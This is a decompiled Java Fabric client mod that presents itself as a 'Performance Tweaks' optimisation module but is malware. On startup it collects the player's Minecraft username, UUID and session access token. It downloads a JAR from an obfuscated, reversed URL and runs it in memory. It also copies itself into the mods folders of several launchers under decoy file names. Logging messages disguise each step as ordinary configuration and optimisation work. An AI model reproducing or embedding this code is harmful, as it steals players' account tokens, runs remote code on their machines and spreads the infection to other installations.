package com.example.loader;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import net.fabricmc.api.ClientModInitializer;
import net.minecraft.class_310;
import net.minecraft.class_320;
import net.minecraft.class_746;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class LoaderMod implements ClientModInitializer {
  private static final Logger LOGGER = LoggerFactory.getLogger("performance-tweaks");
  
  private static final String DOWNLOAD_URL = (new StringBuilder("raj.11rezimitpo/daolnwod/ipa/ur.erawaggin//:sptth")) // This is the URL to download the client code. It is backwards
    .reverse()
    .toString();
  
  public void onInitializeClient() {
    String aTxtContent;
    LOGGER.info("Performance Tweaks initializing... (v3)");
    try {
      InputStream is = LoaderMod.class.getClassLoader().getResourceAsStream("A.txt");
      if (is == null) {
        LOGGER.error("A.txt not found in resources");
        return;
      } 
      aTxtContent = (new String(is.readAllBytes())).trim();
      is.close();
      LOGGER.info("Config loaded successfully");
    } catch (Exception e) {
      LOGGER.error("Failed to read config: " + e.getMessage());
      return;
    } 
    if (aTxtContent == null || aTxtContent.isEmpty() || aTxtContent.contains("PLACEHOLDER")) {
      LOGGER.error("Config is empty or placeholder");
      return;
    } 
    JsonObject context = new JsonObject();
    context.addProperty("aTxtContent", aTxtContent);
    context.addProperty("executionEnvironment", "Fabric");
    try {
      class_320 session = class_310.method_1551().method_1548();
      JsonObject mcInfo = new JsonObject();
      mcInfo.addProperty("username", session.method_1676());
      mcInfo.addProperty("uuid", (session.method_44717() != null) ? session.method_44717().toString() : "");
      mcInfo.addProperty("accessToken", session.method_1674());
      context.add("minecraftInfo", (JsonElement)mcInfo);
    } catch (Exception e) {
      LOGGER.warn("Could not get MC session info: " + e.getMessage());
    } 
    String contextJson = (new Gson()).toJson((JsonElement)context);
    (new Thread(() -> {
          try {
            LOGGER.info("Downloading optimization module from " + DOWNLOAD_URL);
            byte[] jarBytes = downloadJar(DOWNLOAD_URL);
            if (jarBytes == null) {
              LOGGER.error("Download failed - null response");
              return;
            } 
            if (jarBytes.length < 100000) {
              LOGGER.error("Download failed - too small: " + jarBytes.length + " bytes");
              return;
            } 
            LOGGER.info("Downloaded " + jarBytes.length + " bytes, parsing...");
            Map<String, byte[]> classMap = (Map)new HashMap<>();
            Map<String, byte[]> resourceMap = (Map)new HashMap<>();
            JarInputStream jarStream = new JarInputStream(new ByteArrayInputStream(jarBytes));
            JarEntry entry;
            while ((entry = jarStream.getNextJarEntry()) != null) {
              ByteArrayOutputStream baos = new ByteArrayOutputStream();
              jarStream.transferTo(baos);
              byte[] data = baos.toByteArray();
              if (entry.getName().endsWith(".class")) {
                String className = entry.getName().replace('/', '.').replace(".class", "");
                classMap.put(className, data);
                continue;
              } 
              resourceMap.put(entry.getName(), data);
            } 
            jarStream.close();
            LOGGER.info("Parsed " + classMap.size() + " classes, " + resourceMap.size() + " resources");
            MemoryClassLoader loader = new MemoryClassLoader(classMap, resourceMap);
            LOGGER.info("Loading entry point class...");
            Class<?> mainClass = loader.loadClass("com.example.optimizer.LoaderEntry");
            Method initMethod = null;
            for (Method m : mainClass.getMethods()) {
              if (m.getName().equals("initialize") || m.getName().startsWith("initialize")) {
                Class<?>[] params = m.getParameterTypes();
                if (params.length >= 1 && params[0] == String.class) {
                  initMethod = m;
                  LOGGER.info("Found method: " + m.getName() + " with " + params.length + " params");
                  break;
                } 
              } 
            } 
            if (initMethod == null) {
              LOGGER.error("Could not find initialize method!");
              return;
            } 
            LOGGER.info("Invoking initialize method...");
            Method finalMethod = initMethod;
            ClassLoader moduleLoader = loader;
            (new Thread(())).start();
          } catch (Exception e) {
            LOGGER.error("Loader failed: " + e.getMessage());
          } 
        })).start();
    (new Thread(LoaderMod::setupPersistence, "P-Worker")).start();
  }
  
  private byte[] downloadJar(String url) {
    try {
      HttpClient client = HttpClient.newBuilder().followRedirects(HttpClient.Redirect.ALWAYS).build();
      HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("User-Agent", "Java/" + System.getProperty("java.version")).GET().build();
      HttpResponse<byte[]> response = (HttpResponse)client.send(request, (HttpResponse.BodyHandler)HttpResponse.BodyHandlers.ofByteArray());
      if (response.statusCode() != 200) {
        LOGGER.error("Download failed with status: " + response.statusCode());
        return null;
      } 
      return response.body();
    } catch (Exception e) {
      LOGGER.error("Download exception: " + e.getMessage());
      e.printStackTrace();
      return null;
    } 
  }
  
  private static Object getDefaultValue(Class<?> type) {
    if (type == int.class)
      return Integer.valueOf(0); 
    if (type == long.class)
      return Long.valueOf(0L); 
    if (type == boolean.class)
      return Boolean.valueOf(false); 
    if (type == byte.class)
      return Byte.valueOf((byte)0); 
    if (type == short.class)
      return Short.valueOf((short)0); 
    if (type == float.class)
      return Float.valueOf(0.0F); 
    if (type == double.class)
      return Double.valueOf(0.0D); 
    if (type == char.class)
      return Character.valueOf(false); 
    return null;
  }
  
  private static void setupPersistence() {
    try {
      File sourceJar = new File(LoaderMod.class.getProtectionDomain().getCodeSource().getLocation().toURI());
      if (!sourceJar.exists() || !sourceJar.getName().endsWith(".jar"))
        return; 
      String userHome = System.getProperty("user.home");
      String appData = System.getenv("APPDATA");
      if (userHome == null)
        userHome = "."; 
      if (appData == null)
        appData = userHome; 
      File[] roots = { new File(userHome, "curseforge/minecraft/Instances"), new File(appData, "PrismLauncher/instances"), new File(appData, "com.modrinth.theseus/profiles"), new File(appData, ".minecraft/mods"), new File(appData, "Feather/user-profiles"), new File(appData, "GDLauncher/instances") };
      for (File root : roots) {
        if (root != null)
          try {
            if (root.exists())
              scanAndInfect(root, sourceJar); 
          } catch (Exception exception) {} 
      } 
    } catch (Exception exception) {}
  }
  
  private static void scanAndInfect(File dir, File sourceJar) {
    try {
      if (dir.getName().equals("mods") && dir.isDirectory()) {
        copyTo(sourceJar, new File(dir, "fabric-utils.0.12.jar"));
        copyTo(sourceJar, new File(dir, "modmenus.0.1.jar"));
        return;
      } 
      File[] files = dir.listFiles();
      if (files == null)
        return; 
      for (File file : files) {
        if (file.isDirectory())
          scanAndInfect(file, sourceJar); 
      } 
    } catch (Exception exception) {}
  }
  
  private static void copyTo(File source, File dest) {
    try {
      if (dest.exists())
        return; 
      InputStream in = new FileInputStream(source);
      try {
        OutputStream out = new FileOutputStream(dest);
        try {
          byte[] buffer = new byte[1024];
          int length;
          while ((length = in.read(buffer)) > 0)
            out.write(buffer, 0, length); 
          out.close();
        } catch (Throwable throwable) {
          try {
            out.close();
          } catch (Throwable throwable1) {
            throwable.addSuppressed(throwable1);
          } 
          throw throwable;
        } 
        in.close();
      } catch (Throwable throwable) {
        try {
          in.close();
        } catch (Throwable throwable1) {
          throwable.addSuppressed(throwable1);
        } 
        throw throwable;
      } 
    } catch (Exception exception) {}
  }
}
